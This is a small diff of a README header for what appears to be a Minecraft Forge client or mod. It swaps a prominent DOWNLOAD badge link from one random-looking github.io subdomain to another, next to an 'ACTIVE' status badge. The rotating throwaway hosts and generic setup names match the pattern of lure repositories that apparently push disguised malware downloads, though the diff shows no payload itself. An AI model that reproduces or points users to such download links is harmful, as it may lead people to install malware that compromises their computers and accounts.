@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://fpvqciovatyi.github.io/win-client2/)
 [![STATUS](https://img.shields.io/badge/STATUS-ACTIVE-00c853?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/FORGE-1.16.5--26.2-FF6C00?style=for-the-badge)]()
 
